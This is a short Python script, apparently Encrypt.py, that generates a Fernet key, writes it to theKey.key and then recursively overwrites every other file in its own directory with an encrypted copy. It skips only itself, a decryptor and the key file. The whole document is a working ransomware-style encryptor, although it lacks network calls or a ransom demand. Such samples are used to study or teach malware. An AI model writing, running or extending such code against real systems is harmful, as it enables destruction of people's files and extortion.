import os
from cryptography.fernet import Fernet


key = Fernet.generate_key()


def list_files_in_directory(directory):
    all_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file in ["Encrypt.py", "Decrypt.py", "theKey.key"]:
                continue
            full_path = os.path.join(root, file)
            all_files.append(full_path)
    return all_files



directory_path = os.path.dirname(os.path.realpath(__file__))
print(directory_path)
files = list_files_in_directory(directory_path)


with open("theKey.key", "wb") as fh:
    fh.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    content_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)
